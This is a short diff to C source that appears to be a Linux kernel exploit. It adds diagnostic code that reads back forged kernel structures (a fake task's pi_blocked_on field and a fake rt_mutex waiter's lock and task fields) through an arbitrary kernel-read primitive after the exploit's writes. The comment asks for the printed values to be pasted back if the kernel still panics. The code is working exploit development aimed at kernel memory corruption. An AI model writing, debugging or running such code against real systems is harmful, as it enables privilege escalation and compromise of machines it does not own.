@@ -1774,6 +1774,41 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
     return 0;
   }
 
+  /* Diagnostic reads: confirm kernel-visible values after our writes.
+   *
+   * These reads will print:
+   * - task->pi_blocked_on (word at task + FAKE_TASK_PI_BLOCKED_ON_OFF)
+   * - waiter->lock (word at waiter + FAKE_WAITER_LOCK_OFF)
+   * - waiter->task (word at waiter + FAKE_WAITER_TASK_OFF)
+   * - if waiter->lock != 0, read the first qword at that address (may be
+   *   garbage if the pointer is wrong, but it's useful diagnostic info).
+   *
+   * Print these so you can paste them if a panic still happens.
+   */
+  {
+    uint64_t read_task_blocked = kernel_read64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF);
+    uint64_t read_waiter_lock = kernel_read64(fd, waiter + FAKE_WAITER_LOCK_OFF);
+    uint64_t read_waiter_task = kernel_read64(fd, waiter + FAKE_WAITER_TASK_OFF);
+    pr_info("p0 diag post-writes: task.pi_blocked_on=%016llx "
+            "waiter.lock_field=%016llx waiter.task=%016llx\n",
+            (unsigned long long)read_task_blocked,
+            (unsigned long long)read_waiter_lock,
+            (unsigned long long)read_waiter_task);
+
+    if (read_waiter_lock) {
+      /* Try to read the first qword at *waiter->lock (likely the lock's
+       * internal spinlock word or similar). This may fail silently (return
+       * 0) if the address isn't direct/alias-correct; still useful info. */
+      uint64_t lock_first_qword = kernel_read64(fd, (uintptr_t)read_waiter_lock);
+      pr_info("p0 diag: pointer at waiter.lock -> %016llx, *lock_first_qword=%016llx\n",
+              (unsigned long long)read_waiter_lock,
+              (unsigned long long)lock_first_qword);
+    } else {
+      pr_info("p0 diag: waiter.lock_field == 0 (NULL)\n");
+    }
+    fflush(stdout);
+  }
+
   fake_task = task;
   fake_lock = lock;
   fake_w0 = waiter;
